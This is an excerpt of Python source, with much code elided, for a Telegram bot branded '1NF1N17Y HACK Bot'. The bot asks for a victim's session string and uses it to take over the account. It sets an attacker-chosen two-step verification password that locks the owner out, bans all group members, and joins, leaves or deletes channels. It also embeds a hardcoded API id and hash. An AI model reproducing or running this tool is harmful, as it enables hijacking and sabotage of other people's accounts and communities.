...
client = TelegramClient('1NF1N17Y', api_id, api_hash).start(bot_token=token)
...
async def user2fa(strses):
  async with tg(ses(strses), 1621727, "31350903c528876f79527398c09660ce") as X:
    try:
      await X.edit_2fa('1NF1N17YISBEST')
      return True
    except:
      return False
...
async def start(event):
  ...
  async with bot.conversation(event.chat_id) as x:
    ...
    if res.text == "A":
      ...
      await event.reply("Banning all members Thanks For usiNG 1NF1N17Y HACK Bot")
    elif r == "D":
      await x.send_message("GIVE STRING SESSION")
      strses = await x.get_response()
      op = await cu(strses.text)
      ...
      await event.reply("Joined the Channel/Group Thanks For using 1NF1N17Y HACK Bot")
    elif r == "F":
      await x.send_message("GIVE STRING SESSION")
      strses = await x.get_response()
      op = await cu(strses.text)
      ...
      await event.reply("Leaved the Channel/Group Thanks For using 1NF1N17Y HACK Bot")
    elif r == "G":
      await x.send_message("GIVE STRING SESSION")
      strses = await x.get_response()
      op = await cu(strses.text)
      ...
      await event.reply("Deleted the Channel/Group Thanks For using 1NF1N17Y HACK BOT")
    elif r == "H":
      await x.send_message("GIVE STRING SESSION")
      strses = await x.get_response()
      op = await cu(strses.text)
      ...
      try:
        ...
        await event.respond("SEND THIS ERROR TO - @ProHere\n**LOGS**\n" + str(e))
